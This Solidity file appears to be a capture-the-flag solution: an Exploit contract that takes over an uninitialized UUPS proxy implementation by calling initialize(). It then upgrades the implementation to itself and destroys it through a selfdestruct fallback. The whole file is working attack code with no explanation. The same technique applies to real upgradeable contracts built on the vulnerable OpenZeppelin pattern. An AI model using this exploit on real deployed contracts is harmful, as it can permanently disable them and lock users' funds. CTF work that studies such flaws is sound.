// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Setup.sol';
import "@openzeppelin/contracts-4-3-1/token/ERC20/ERC20.sol";

contract Exploit {
    Superfluid impl;
    constructor (Setup _challenge) {
        impl = Superfluid(payable(_challenge.impl()));
    }

    function exploit() external {
        impl.initialize();
        impl.upgradeToAndCall(address(this), "");
    }

    function upgradeTo(address _address) external
    {
        _setImplementation(_address);
    }

    function _setImplementation(address newImplementation) private {
        StorageSlotUpgradeable.getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newImplementation;
    }

    fallback() external payable {
        selfdestruct(payable(address(0)));
    }
}
